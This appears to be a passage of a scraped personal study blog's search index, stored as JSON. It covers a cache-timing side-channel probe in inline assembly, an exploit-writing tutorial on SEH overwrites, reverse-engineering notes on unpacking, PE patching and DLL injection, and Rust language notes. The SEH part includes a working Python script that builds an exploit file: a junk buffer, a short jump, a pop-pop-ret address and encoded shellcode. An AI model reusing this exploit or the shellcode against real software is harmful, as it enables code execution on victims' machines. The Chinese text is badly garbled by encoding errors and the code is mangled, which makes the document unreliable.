arm asm __volatile__ ( \" mfence \\n\" //cpuid (intel) è™šæ‹Ÿæœºä¼šæ¨¡æ‹Ÿè¯¥æŒ‡ä»¤ï¼Œå¯¼è‡´æ—¶é—´å¢åŠ  \" lfence \\n\" \" rdtsc \\n\" \" lfence \\n\" //reads the 64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx \" movl %%eax, %%esi \\n\" //æŠŠrdtscè¿”å›çš„æ—¶é—´ä¼ å…¥ESIä¿å­˜ \" movl (%1), %%eax \\n\" //%1è¡¨ç¤ºadrs reads 4 bytes from the memory address in%ecx \" lfence \\n\" //ï¼ˆï¼‰è¡¨ç¤ºæŒ‡é’ˆ \" rdtsc \\n\" \" subl %%esi, %%eax \\n\" //rdtscè¿”å›å€¼ä¿å­˜åœ¨eax.ç›¸å‡ï¼Œç»“æœä¿å­˜åœ¨eax \" clflush 0(%1) \\n\" //()å‰”é™¤ç¼“å­˜ä¸­çš„å€¼ : \"=a\" (time) : \"c\" (adrs) //c infer edc : \"%esi\", \"%edx\"); return time; /*Loads shorter than the threshold are presumed tobe served from the cache, indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/&#125;","categories":[],"tags":[{"name":"C++","slug":"C","permalink":"http://finsenty54.github.io/tags/C/"}]},{"title":"SEH","slug":"SEH","date":"2020-09-21T14:25:04.000Z","updated":"2020-09-21T14:25:59.079Z","comments":true,"path":"2020/09/21/SEH/","link":"","permalink":"http://finsenty54.github.io/2020/09/21/SEH/","excerpt":"PWNå­¦ä¹ Exploit writing tutorial part 3 : SEH Based Exploits","text":"PWNå­¦ä¹ Exploit writing tutorial part 3 : SEH Based Exploits 1st exception occurs : | â€”â€”â€”â€”â€”â€”â€”â€”â€” (1) | â€”â€”-+â€”â€”â€”â€”â€“ (3) opcode in next SEH : jump over SE Handler to the shellcode | | | | V V[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ] opcode to do (3) Shellcode gets executed jump over pop pop ret SE Handler | ^ | | | â€”â€”â€”â€”â€“ (2) will â€˜pretendâ€™ thereâ€™s a second exception, puts address of next SEH location in EIP, so opcode gets executed å½“ä¸€ä¸ªå¼‚å¸¸è§¦å‘æ—¶ï¼Œä¼šå»ºç«‹è‡ªå·±çš„æ ˆï¼Œpush EH Handlerçš„å‚æ•°ï¼Œåœ¨ESP+8å¤„çš„EstablisherFrameæŒ‡å‘ä¸‹ä¸€ä¸ªSEHï¼Œåœ¨è¿™é‡Œå†™pop pop retçš„åœ°å€ the first pop will take off4 bytes from the stackthe second pop will take another4 bytesfrom the stackthe ret will take thecurrent valuefrom the top of ESP ( = the address of the next SEH, which was atESP+8, but because of the 2 popâ€™s now sits at the top of the stack) and puts that in EIP. SEHé“¾ollydbg VIEW-SEH CHAIN patternmsf-pattern_create -l 5000äº§ç”Ÿä¸€ä¸ªåºåˆ—ï¼Œç”¨äºå®šä½æº¢å‡ºç‚¹ msf5 &gt; msfpescan -p Player.dll | grep -v â€œ000â€å¯»æ‰¾pop pop ret å‘½ä»¤åœ°å€ -v ä¸åŒ¹é…â€œ000â€ int 3 æŒ‡ä»¤ï¼ˆ0xccï¼‰ ä¸­æ–­æŒ‡ä»¤ import struct uitext = &quot;ui_exploit.txt&quot; junk = &quot;\\x41&quot; * 584 seh_next = &quot;\\xeb\\x04\\x90\\x90&quot; seh_handler = str(struct.pack(&apos;&lt;L&apos;, 0x10018de8)) shellcode = &quot;\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x4f\\x49\\x49\\x49\\x49\\x49&quot; +\\ &quot;\\x49\\x51\\x5a\\x56\\x54\\x58\\x36\\x33\\x30\\x56\\x58\\x34\\x41\\x30\\x42\\x36&quot; +\\ &quot;\\x48\\x48\\x30\\x42\\x33\\x30\\x42\\x43\\x56\\x58\\x32\\x42\\x44\\x42\\x48\\x34&quot; +\\ &quot;\\x41\\x32\\x41\\x44\\x30\\x41\\x44\\x54\\x42\\x44\\x51\\x42\\x30\\x41\\x44\\x41&quot; +\\ &quot;\\x56\\x58\\x34\\x5a\\x38\\x42\\x44\\x4a\\x4f\\x4d\\x4e\\x4f\\x4a\\x4e\\x46\\x44&quot; +\\ &quot;\\x42\\x30\\x42\\x50\\x42\\x30\\x4b\\x38\\x45\\x54\\x4e\\x33\\x4b\\x58\\x4e\\x37&quot; +\\ &quot;\\x45\\x50\\x4a\\x47\\x41\\x30\\x4f\\x4e\\x4b\\x38\\x4f\\x44\\x4a\\x41\\x4b\\x48&quot; +\\ &quot;\\x4f\\x35\\x42\\x32\\x41\\x50\\x4b\\x4e\\x49\\x34\\x4b\\x38\\x46\\x43\\x4b\\x48&quot; +\\ &quot;\\x41\\x30\\x50\\x4e\\x41\\x43\\x42\\x4c\\x49\\x39\\x4e\\x4a\\x46\\x48\\x42\\x4c&quot; +\\ &quot;\\x46\\x37\\x47\\x50\\x41\\x4c\\x4c\\x4c\\x4d\\x50\\x41\\x30\\x44\\x4c\\x4b\\x4e&quot; +\\ &quot;\\x46\\x4f\\x4b\\x43\\x46\\x35\\x46\\x42\\x46\\x30\\x45\\x47\\x45\\x4e\\x4b\\x48&quot; +\\ &quot;\\x4f\\x35\\x46\\x42\\x41\\x50\\x4b\\x4e\\x48\\x46\\x4b\\x58\\x4e\\x30\\x4b\\x54&quot; +\\ &quot;\\x4b\\x58\\x4f\\x55\\x4e\\x31\\x41\\x50\\x4b\\x4e\\x4b\\x58\\x4e\\x31\\x4b\\x48&quot; +\\ &quot;\\x41\\x30\\x4b\\x4e\\x49\\x38\\x4e\\x45\\x46\\x52\\x46\\x30\\x43\\x4c\\x41\\x43&quot; +\\ &quot;\\x42\\x4c\\x46\\x46\\x4b\\x48\\x42\\x54\\x42\\x53\\x45\\x38\\x42\\x4c\\x4a\\x57&quot; +\\ &quot;\\x4e\\x30\\x4b\\x48\\x42\\x54\\x4e\\x30\\x4b\\x48\\x42\\x37\\x4e\\x51\\x4d\\x4a&quot; +\\ &quot;\\x4b\\x58\\x4a\\x56\\x4a\\x50\\x4b\\x4e\\x49\\x30\\x4b\\x38\\x42\\x38\\x42\\x4b&quot; +\\ &quot;\\x42\\x50\\x42\\x30\\x42\\x50\\x4b\\x58\\x4a\\x46\\x4e\\x43\\x4f\\x35\\x41\\x53&quot; +\\ &quot;\\x48\\x4f\\x42\\x56\\x48\\x45\\x49\\x38\\x4a\\x4f\\x43\\x48\\x42\\x4c\\x4b\\x37&quot; +\\ &quot;\\x42\\x35\\x4a\\x46\\x42\\x4f\\x4c\\x48\\x46\\x50\\x4f\\x45\\x4a\\x46\\x4a\\x49&quot; +\\ &quot;\\x50\\x4f\\x4c\\x58\\x50\\x30\\x47\\x45\\x4f\\x4f\\x47\\x4e\\x43\\x36\\x41\\x46&quot; +\\ &quot;\\x4e\\x36\\x43\\x46\\x42\\x50\\x5a&quot; junk2 = &quot;\\x90&quot; * 1000 fp = open(uitext, &apos;w&apos;) content = junk + seh_next + seh_handler + shellcode + junk2 fp.write(content) fp.close() æ€»ç»“ï¼šSEHé“¾æ¡ç»“æ„åŠå…¶åœ¨æ ˆä¸­çš„ä½ç½®Windows XP SP1æ·»åŠ çš„XORå’ŒSafeSEHä¿æŠ¤æœºåˆ¶é€šè¿‡msfçš„msfpescanä»dllä¸­æŸ¥æ‰¾å¸¦æœ‰æƒ³è¦æ“ä½œçš„å‡½æ•°ï¼ˆâ€œPOP POP RETâ€ï¼‰RETæ“ä½œä½œä¸ºexploitæ–¹å¼çš„ä¼˜ç¼ºç‚¹é€šè¿‡windbgçš„â€!analyze -vâ€œ å’Œâ€œ!exchainâ€å‘½ä»¤æŸ¥çœ‹current SEHæŒ‡é’ˆå†…å®¹windbgï¼šd eip ; !exchainå‘½ä»¤ ï¼›u åœ°å€ ï¼›g è¿è¡Œ frog é’è›™","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://finsenty54.github.io/tags/PWN/"}]},{"title":"RCE åˆæ¢","slug":"RCE åˆæ¢","date":"2020-08-18T13:07:01.000Z","updated":"2020-08-18T13:07:58.509Z","comments":true,"path":"2020/08/18/RCE åˆæ¢/","link":"","permalink":"http://finsenty54.github.io/2020/08/18/RCE åˆæ¢/","excerpt":"UPXupx == åŠ å£³ï¼Ÿä»£ç å‹ç¼©å™¨ï¼Œæ‰§è¡Œæ—¶è§£ç åè¿è¡ŒPS .\\upx.exe -1 -o notepad_upx.exe D:\\RCE\\notepad.exe","text":"UPXupx == åŠ å£³ï¼Ÿä»£ç å‹ç¼©å™¨ï¼Œæ‰§è¡Œæ—¶è§£ç åè¿è¡ŒPS .\\upx.exe -1 -o notepad_upx.exe D:\\RCE\\notepad.exe æ®µå¯„å­˜å™¨ 16 ä½DS å­˜æ”¾æ•°æ®æ®µçš„æ®µåŸºå€ æ¯ä¸€ä¸ªå†…å­˜å•å…ƒçš„å®½åº¦ä¸º8ä½ã€‚[ç¼–å·]ç§°ä¸ºåœ°å€ã€‚å†…å­˜å•å…ƒï¼šå­—èŠ‚ æ¯ä¸ªå­—èŠ‚æœ‰ä¸ªç¼–å·ï¼Œç§°ä¸ºå†…å­˜åœ°å€ dword ptr [esi+13000]=[notepad.01014000]=14D Lâ€™Åâ€™ ds å¯„å­˜å™¨æ²¡ç”¨ï¼Ÿ åœ¨æ ˆä¸­è®¾ç½®ç¡¬ä»¶æ–­ç‚¹ æ‰¾åˆ°è§£å£³åçš„OEPå…·ä½“åœ¨PUSHADä¸­è®¾ç½®ç¡¬ä»¶æ–­ç‚¹ï¼ŒæŒ‡ä»¤å®Œæˆåæ‰æš‚åœ ï¼Œä¹Ÿå°±æ˜¯POPAD å®Œæˆåæš‚åœ ï¼Œåé¢JMPè·³è½¬åˆ°OEP original EP exeé»˜è®¤00400000dll é»˜è®¤10000000 èŠ‚å¯¹é½Alignment is a rounded up value. Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.The Section Alignment is usually 4096 bytes which fit the size of a memory page.So if you have a PE-file with a section (like â€œ.textâ€) that contains513 bytes of data: ä¸è¶³çš„æ”¹ä¸ºæ•´æ•°å€Section .text will be rounded up to 1024 bytes on file.Section .text will be rounded up to 4096bytes in memory.Note the amount of slack space possible both on file and in memory. stud_peä¿®æ”¹size of optional headerå€¼ï¼Œå‘æ–‡ä»¶å¤´æ’å…¥è§£ç ä»£ç åœ¨é€‰é¡¹å¤´å’ŒèŠ‚åŒºå¤´é—´æ’å…¥ä»£ç numberofRVAandSIZESè¡¨ç¤ºdata_directoryç»“æ„ä½“å…ƒç´ ä¸ªæ•°(æœ‰äº›æ²¡ç”¨ï¼Œå¯ä»¥è¦†ç›–) inline patch å†…åµŒè¡¥ä¸å°†è¡¥ä¸ä»£ç æ”¾åœ¨ç©ºç™½å—ä¸­ å˜é‡åå’Œå‡½æ•°ååªæ˜¯åœ°å€çš„ä¸€ç§åŠ©è®°ç¬¦ï¼Œå½“æºæ–‡ä»¶è¢«ç¼–è¯‘å’Œé“¾æ¥æˆå¯æ‰§è¡Œç¨‹åºåï¼Œå®ƒä»¬éƒ½ä¼šè¢«æ›¿æ¢æˆåœ°å€ã€‚ å–åœ°å€ç¬¦&amp; .text çš„ size of raw data == 400 virtual size == 280 æ–‡ä»¶ä¸­400 åŠ è½½åˆ°å†…å­˜ä¸­åªåŠ äº†280å…¶ä»–å€¼æ—¶0x00 image_scn_men_write ç›¸åº”å†…å­˜åŒºçš„å†™æƒé™ rep movsb å‘½ä»¤ b==byte rep == repeats ECX é‡Œå¤§å° å¾ªç¯ moves å‘½ä»¤== ds:esi -&gt; ds:edidecreasing CX, so at the end CX becomes zero. RCEç»éªŒ1 å‹ç¼©å™¨è§£ç 2 åŒºåŸŸåŒé‡åŠ å¯† å†…åµŒè¡¥ä¸ test æŒ‰ä½ä¸test eax, eaxeax==0 zf è®¾ä½1 Retç›¸å½“äº Pop EIP DLLæ³¨å…¥threadProc çº¿ç¨‹åˆ›å»ºå‡½æ•°ç”¨å¥æŸ„æ§åˆ¶ç›¸åº”è¿›ç¨‹ä¸‰ç§æ–¹æ³•ï¼šåˆ›å»ºè¿œç¨‹çº¿ç¨‹é’©å­æ³¨å…¥è®¾ç½®é‡Œå…¨å±€æ³¨å…¥ SPaCIoS","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"RUSTå­¦ä¹ 4","slug":"RUSTå­¦ä¹ 4","date":"2020-08-14T04:26:23.000Z","updated":"2020-08-14T04:27:08.603Z","comments":true,"path":"2020/08/14/RUSTå­¦ä¹ 4/","link":"","permalink":"http://finsenty54.github.io/2020/08/14/RUSTå­¦ä¹ 4/","excerpt":"Result&lt;T, E&gt;Rust doesnâ€™t have exceptions. Instead, it has the typeResult&lt;T, E&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. When the panic!macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.","text":"Result&lt;T, E&gt;Rust doesnâ€™t have exceptions. Instead, it has the typeResult&lt;T, E&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. When the panic!macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.result enum is defined as having two variants, Ok and Err, The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called unwrap, is a shortcut method that is implemented just like the match 12345use std::fs::File;fn main() &#123; let f = File::open(\"hello.txt\").unwrap();&#125; 12345use std::fs::File;fn main() &#123; let f = File::open(\"hello.txt\").expect(\"Failed to open hello.txt\");&#125; Propagating Errors1234567fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;let f = File::open(\"hello.txt\"); let mut f = match f &#123; Ok(file) =&gt; file, Err(e) =&gt; return Err(e), &#125;; A Shortcut for Propagating Errors: the ? OperatorThe?placed after a Result value is defined to work in almost the same way as the match expressions If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code. 12File::open(\"hello.txt\")?.read_to_string(&amp;mut s)?;Ok(s) 12fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123; fs::read_to_string(\"hello.txt\") If you can ensure by manually inspecting the code that youâ€™ll never have an Err variant, itâ€™s perfectly acceptable to callunwrap. Hereâ€™s an example: Generic æ³›å‹å°†ä»£ç æŠ½å–å‡ºæ¥ï¼Œå‡å°‘é‡å¤ä»£ç 123456789101112fn largest&lt;T&gt;(list: &amp;[T]) -&gt; T &#123;struct Point&lt;T, U&gt; &#123; //T Uä»£è¡¨ä¸åŒçš„ç±»å‹ x: T, y: U,&#125;fn main() &#123; let both_integer = Point &#123; x: 5, y: 10 &#125;; let both_float = Point &#123; x: 1.0, y: 4.0 &#125;; let integer_and_float = Point &#123; x: 5, y: 4.0 &#125;;&#125; where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file. 12345678910111213141516struct Point&lt;T&gt; &#123; x: T, y: T,&#125;impl&lt;T&gt; Point&lt;T&gt; &#123; fn x(&amp;self) -&gt; &amp;T &#123; &amp;self.x &#125;&#125;fn main() &#123; let p = Point &#123; x: 5, y: 10 &#125;; println!(\"p.x = &#123;&#125;\", p.x());&#125; Note that we have to declare T just after implso we can use it to specify that weâ€™re implementing methods on the type Point. 1234567891011121314151617181920212223struct Point&lt;T, U&gt; &#123; x: T, y: U,&#125;impl&lt;T, U&gt; Point&lt;T, U&gt; &#123; fn mixup&lt;V, W&gt;(self, other: Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123; Point &#123; x: self.x, y: other.y, &#125; &#125;&#125;fn main() &#123; let p1 = Point &#123; x: 5, y: 10.4 &#125;; let p2 = Point &#123; x: \"Hello\", y: 'c' &#125;; let p3 = p1.mixup(p2); println!(\"p3.x = &#123;&#125;, p3.y = &#123;&#125;\", p3.x, p3.y);&#125; traitsDifferent types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose. Each type implementing this trait must provideits own custom behaviorfor the body of the method.ç›¸å½“äºæä¾›ä¸€ä¸ªæ¥å£ï¼Œå…·ä½“å†…å®¹è‡ªå·±å®ç°ä¸Javaä¸€ä¸ªæ¦‚å¿µç±»ä¼¼ 123456789101112131415161718192021222324252627282930313233343536373839#![allow(unused_variables)]fn main() &#123;pub trait Summary &#123; fn summarize(&amp;self) -&gt; String;&#125;&#125;#![allow(unused_variables)]fn main() &#123;pub trait Summary &#123; fn summarize(&amp;self) -&gt; String;&#125;pub struct NewsArticle &#123; pub headline: String, pub location: String, pub author: String, pub content: String,&#125;impl Summary for NewsArticle &#123; //æ·»åŠ traitåˆ°ç»“æ„ä¸­ fn summarize(&amp;self) -&gt; String &#123; format!(\"&#123;&#125;, by &#123;&#125; (&#123;&#125;)\", self.headline, self.author, self.location) &#125;&#125;pub struct Tweet &#123; pub username: String, pub content: String, pub reply: bool, pub retweet: bool,&#125;impl Summary for Tweet &#123; fn summarize(&amp;self) -&gt; String &#123; format!(\"&#123;&#125;: &#123;&#125;\", self.username, self.content) &#125;&#125;&#125; Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, theyâ€™re all in the same scope. Letâ€™s say this lib.rs is for a crate weâ€™ve called aggregator and someone else wants to use our crateâ€™s functionality to implement the Summary trait on a struct defined within their libraryâ€™s scope. They would need to bring the trait into their scope first. They would do so by specifying use aggregator::Summary;, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12. with trait implementations is that we canimplement a trait on a type only if either the trait or the type is local to our cratecanâ€™t implement external traits on external types. as we implement the trait on a particular type, we can keep or override each methodâ€™s default behavior.specify an empty impl block with impl Summary for NewsArticle {}. 123456789101112131415161718192021222324252627282930#![allow(unused_variables)]fn main() &#123;pub trait Summary &#123; fn summarize(&amp;self) -&gt; String &#123; String::from(\"(Read more...)\") &#125;&#125;pub struct NewsArticle &#123; pub headline: String, pub location: String, pub author: String, pub content: String,&#125;impl Summary for NewsArticle &#123;&#125;pub struct Tweet &#123; pub username: String, pub content: String, pub reply: bool, pub retweet: bool,&#125;impl Summary for Tweet &#123; fn summarize(&amp;self) -&gt; String &#123; format!(\"&#123;&#125;: &#123;&#125;\", self.username, self.content) &#125;&#125;&#125; Default implementations can call other methods in the same trait, even if those other methods donâ€™t have a default implementation. ![allow(unused_variables)]fn main() {pub trait Summary { fn summarize_author(&amp;self) -&gt; String; fn summarize(&amp;self) -&gt; String { format!(&quot;(Read more from {}...)&quot;, self.summarize_author()) } } pub struct Tweet { pub username: String, pub content: String, pub reply: bool, pub retweet: bool,} impl Summary for Tweet { fn summarize_author(&amp;self) -&gt; String { format!(â€œ@{}â€, self.username) }}} pub trait Summary { fn summarize(&amp;self) -&gt; String;} pub struct NewsArticle { pub headline: String, pub location: String, pub author: String, pub content: String,} impl Summary for NewsArticle { fn summarize(&amp;self) -&gt; String { format!(â€œ{}, by {} ({})â€, self.headline, self.author, self.location) }} pub struct Tweet { pub username: String, pub content: String, pub reply: bool, pub retweet: bool,} impl Summary for Tweet { fn summarize(&amp;self) -&gt; String { format!(â€œ{}: {}â€, self.username, self.content) }} pub fn notify(item: &amp;impl Summary) { println!(â€œBreaking news! {}â€, item.summarize());} bound traitpub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {ä¼ å…¥çš„ç±»å‹å¿…é¡»ç›¸åŒ pub fn notify(item: &amp;(impl Summary + Display)) { pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) { fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32 where T: Display + Clone, U: Clone + Debug { an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,pub trait Summary { fn summarize(&amp;self) -&gt; String;} pub struct NewsArticle { pub headline: String, pub location: String, pub author: String, pub content: String,} impl Summary for NewsArticle { fn summarize(&amp;self) -&gt; String { format!(â€œ{}, by {} ({})â€, self.headline, self.author, self.location) }} pub struct Tweet { pub username: String, pub content: String, pub reply: bool, pub retweet: bool,} impl Summary for Tweet { fn summarize(&amp;self) -&gt; String { format!(â€œ{}: {}â€, self.username, self.content) }} fn returns_summarizable() -&gt; impl Summary { Tweet { username: String::from(â€œhorse_ebooksâ€), content: String::from( â€œof course, as you probably already know, peopleâ€, ), reply: false, retweet: false, }} 1234567891011fn largest&lt;T: PartialOrd + Copy&gt;(list: &amp;[T]) -&gt; T &#123; //é™åˆ¶åªèƒ½ä¼ è¿›i32 charç­‰ let mut largest = list[0]; for &amp;item in list &#123; if item &gt; largest &#123; largest = item; &#125; &#125; largest&#125; fn main() { let number_list = vec![34, 50, 25, 100, 65]; let result = largest(&amp;number_list); println!(&quot;The largest number is {}&quot;, result); let char_list = vec![&apos;y&apos;, &apos;m&apos;, &apos;a&apos;, &apos;q&apos;]; let result = largest(&amp;char_list); println!(&quot;The largest char is {}&quot;, result); } impl&lt;T: Display&gt; ToString for T { // â€“snipâ€“} The Borrow Checkerweâ€™ll add generic lifetime parameters that define the relationship between the references lifetimeLifetime annotations donâ€™t change how long any of the references live. &amp;i32 // a reference &amp;&apos;a i32 // a reference with an explicit lifetime &amp;&apos;a mut i32 // a mutable reference with an explicit lifetime have a function with the parameter first that is a reference to an i32 with lifetime â€˜a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime â€˜a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime. 123456789101112131415fn main() &#123; let string1 = String::from(\"abcd\"); let string2 = \"xyz\"; let result = longest(string1.as_str(), string2); println!(\"The longest string is &#123;&#125;\", result);&#125;fn longest&lt;'a&gt;(x: &amp;'a str, y: &amp;'a str) -&gt; &amp;'a str &#123; if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125; è¿”å›çš„å¼•ç”¨å–æœ€çŸ­çš„lifetime 1234567891011struct ImportantExcerpt&lt;'a&gt; &#123; part: &amp;'a str,&#125;fn main() &#123; let novel = String::from(\"Call me Ishmael. Some years ago...\"); let first_sentence = novel.split('.').next().expect(\"Could not find a '.'\"); let i = ImportantExcerpt &#123; part: first_sentence, &#125;;&#125; an instance of ImportantExcerpt canâ€™t outlive the reference itholds in its part field. Lifetime Elisionç”±ç¼–è¯‘å™¨è¿›è¡Œå¼•ç”¨lifetimeçš„ç¼–å†™ä¸‰ä¸ªé˜¶æ®µ The Static Lifetime1234#![allow(unused_variables)]fn main() &#123;let s: &amp;'static str = \"I have a static lifetime.\";&#125; means that this reference can live for the entire duration of the program lifetimes are a type of generic,fn main() { let string1 = String::from(â€œabcdâ€); let string2 = â€œxyzâ€; let result = longest_with_an_announcement( string1.as_str(), string2, &quot;Today is someone&apos;s birthday!&quot;, ); println!(&quot;The longest string is {}&quot;, result); } use std::fmt::Display; 123456789101112131415fn longest_with_an_announcement&lt;'a, T&gt;( x: &amp;'a str, y: &amp;'a str, ann: T,) -&gt; &amp;'a strwhere T: Display,&#123; println!(\"Announcement! &#123;&#125;\", ann); if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125; testcargo testChecking Results with the assert! MacroThe assert!macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true. assert_eq! and assert_ne!These macros compare two arguments for equality or inequality, respectively. should_panic äº§ç”Ÿpanicè¿”å›æ­£ç¡®1234567891011121314151617181920212223242526272829pub struct Guess &#123; value: i32,&#125;impl Guess &#123; pub fn new(value: i32) -&gt; Guess &#123; if value &lt; 1 || value &gt; 100 &#123; panic!(\"Guess value must be between 1 and 100, got &#123;&#125;.\", value); &#125; Guess &#123; value &#125; &#125;&#125;#[cfg(test)]mod tests &#123; use super::*; #[test] #[should_panic] fn greater_than_100() &#123; Guess::new(200); &#125;&#125;fn main() &#123;&#125;#[test]#[should_panic(expected = \"Guess value must be less than or equal to 100\")] the unit type, () TDD process test è¿˜æ˜¯å¾ˆä¸å¤šçš„ï¼ŒC++çš„æ—¶å€™éƒ½ä¸€ééè¾“å…¥å‚æ•° $ cargo run &gt; output.txt","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"RUSTå­¦ä¹ 3","slug":"RUSTå­¦ä¹ 3","date":"2020-08-03T05:58:28.000Z","updated":"2020-08-03T05:59:20.019Z","comments":true,"path":"2020/08/03/RUSTå­¦ä¹ 3/","link":"","permalink":"http://finsenty54.github.io/2020/08/03/RUSTå­¦ä¹ 3/","excerpt":"DebugThe Debug traitenables us to print our struct in a way that is useful for developers so we can see its value while weâ€™re debugging our code.","text":"DebugThe Debug traitenables us to print our struct in a way that is useful for developers so we can see its value while weâ€™re debugging our code.1234567891011121314[derive(Debug)] //å¼€å¯ä½¿ç”¨debug :?æ‰“å°ç»“æ„ä½“struct Rectangle &#123; width: u32, height: u32,&#125;fn main() &#123; let rect1 = Rectangle &#123; width: 30, height: 50, &#125;; println!(\"rect1 is &#123;:?&#125;\", rect1); //or&#123;:#?&#125;&#125; methodtheir first parameter is always self,which represents the instance of the struct the method is being called on. impl (implementation) Methods cantake ownership of self, borrowself immutablyas weâ€™ve done here, or borrow self mutably, just as they can any other parameter.&amp;mut self associated functionYouâ€™ve already used the String::from associated function. Associated functions are often used for constructors that will return a new instance of the struct.123456789101112131415161718[derive(Debug)]struct Rectangle &#123; width: u32, height: u32,&#125;impl Rectangle &#123; fn square(size: u32) -&gt; Rectangle &#123; //æ²¡æœ‰self Rectangle &#123; width: size, height: size, &#125; &#125;&#125;fn main() &#123; let sq = Rectangle::square(3);&#125; Each struct is allowed to have multiple impl blocks. Enumæšä¸¾1234567891011121314enum IpAddrKind &#123; V4, //V4 V6å°±æ˜¯æ‰€è°“çš„å˜ä½“ V6,&#125;fn main() &#123; let four = IpAddrKind::V4; let six = IpAddrKind::V6; route(IpAddrKind::V4); route(IpAddrKind::V6);&#125;fn route(ip_kind: IpAddrKind) &#123;&#125; æšä¸¾æ¯”structæ›´ç®€æ˜12345678910fn main() &#123; enum IpAddr &#123; V4(String), V6(String), &#125; let home = IpAddr::V4(String::from(\"127.0.0.1\")); let loopback = IpAddr::V6(String::from(\"::1\"));&#125; æšä¸¾æ¯ä¸ªå˜ä½“å¯ä»¥æœ‰ä¸åŒçš„ç±»å‹12345678910fn main() &#123; enum IpAddr &#123; V4(u8, u8, u8, u8), V6(String), &#125; let home = IpAddr::V4(127, 0, 0, 1); let loopback = IpAddr::V6(String::from(\"::1\"));&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041[allow(unused_variables)]fn main() &#123;struct Ipv4Addr &#123; // --snip--&#125;struct Ipv6Addr &#123; // --snip--&#125;enum IpAddr &#123; V4(Ipv4Addr), V6(Ipv6Addr),&#125;&#125;enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32), &#125; impl Message &#123; fn call(&amp;self) &#123; // method body would be defined here &#125; &#125; let m = Message::Write(String::from(\"hello\")); m.call();&#125; enum option1234567![allow(unused_variables)]fn main() &#123;enum Option&lt;T&gt; &#123; //&lt;T&gt; means the Some variant of the Option enum can hold one piece of data of any type Some(T), None,&#125;&#125; optionä¸ç”¨æ˜¾ç¤ºå¼•å…¥ï¼Œå·²ç»æå‰æœ‰äº† 123456fn main() &#123; let some_number = Some(5); let some_string = Some(\"a string\"); let absent_number: Option&lt;i32&gt; = None;&#125; If we use None rather than Some, we need to tell Rust whattype of Option&lt;T&gt; we haveOption and T (where T can be any type) are different types,In other words, you have to convert an Option to a T before you can perform T operations with it. 123456789101112131415161718matchenum Coin &#123; Penny, Nickel, Dime, Quarter,&#125;fn value_in_cents(coin: Coin) -&gt; u8 &#123; match coin &#123; Coin::Penny =&gt; 1, Coin::Nickel =&gt; 5, Coin::Dime =&gt; 10, Coin::Quarter =&gt; 25, &#125;&#125;fn main() &#123;&#125; The code associated with each arm is an expression, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression. 1234567891011fn value_in_cents(coin: Coin) -&gt; u8 &#123; match coin &#123; Coin::Penny =&gt; &#123; println!(\"Lucky penny!\"); 1 &#125; Coin::Nickel =&gt; 5, Coin::Dime =&gt; 10, Coin::Quarter =&gt; 25, &#125;&#125; 123456789101112131415161718192021222324252627282930[derive(Debug)]enum UsState &#123; Alabama, Alaska, // --snip--&#125;enum Coin &#123; Penny, Nickel, Dime, Quarter(UsState),&#125;fn value_in_cents(coin: Coin) -&gt; u8 &#123; match coin &#123; Coin::Penny =&gt; 1, Coin::Nickel =&gt; 5, Coin::Dime =&gt; 10, Coin::Quarter(state) =&gt; &#123; println!(\"State quarter from &#123;:?&#125;!\", state); //å¾—åˆ°coiné‡Œquarteré‡Œçš„usstateå€¼ 25 &#125; &#125;&#125;fn main() &#123; value_in_cents(Coin::Quarter(UsState::Alaska));&#125; ä½¿ç”¨option123456789101112fn main() &#123; fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123; match x &#123; None =&gt; None, Some(i) =&gt; Some(i + 1), &#125; &#125; let five = Some(5); let six = plus_one(five); let none = plus_one(None);&#125; Combining match and enums is useful in many situations.match against an enum, bind a variable to the data inside, and then execute code based on it. 12345678910fn main() &#123; let some_u8_value = 0u8; match some_u8_value &#123; 1 =&gt; println!(\"one\"), 3 =&gt; println!(\"three\"), 5 =&gt; println!(\"five\"), 7 =&gt; println!(\"seven\"), _ =&gt; (), &#125;&#125; _çœç•¥The _ pattern will match any value.The () is just the unit value if letcare about only one of the cases. For this situation, Rust provides if let.123456fn main() 